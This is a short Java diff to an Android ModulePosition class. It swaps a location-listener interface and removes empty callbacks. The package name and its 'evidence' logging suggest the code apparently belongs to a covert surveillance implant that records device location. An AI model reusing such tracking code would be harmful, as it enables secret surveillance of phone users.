@@ -35,13 +35,14 @@ import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.interfaces.IncrementalLog;
+import com.android.networking.module.position.GPSLocationListener;
 import com.android.networking.module.position.GPSLocatorAuto;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
 
-public class ModulePosition extends BaseInstantModule implements IncrementalLog, LocationListener {
+public class ModulePosition extends BaseInstantModule implements IncrementalLog, GPSLocationListener {
 	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
@@ -212,6 +213,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		GPSLocatorAuto.self().start(this);
 	}
 
+	@Override
 	public void onLocationChanged(Location location) {
 		if (location == null) {
 			if (Cfg.DEBUG) {
@@ -243,18 +245,6 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		if (Cfg.LOG_POSITION) {
 
 		}
-	}
-
-	public void onProviderDisabled(String arg0) {
-
-	}
-
-	public void onProviderEnabled(String arg0) {
-
-	}
-
-	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
-
 	}
 
 	private byte[] getAdditionalData(int structNum, int type) {
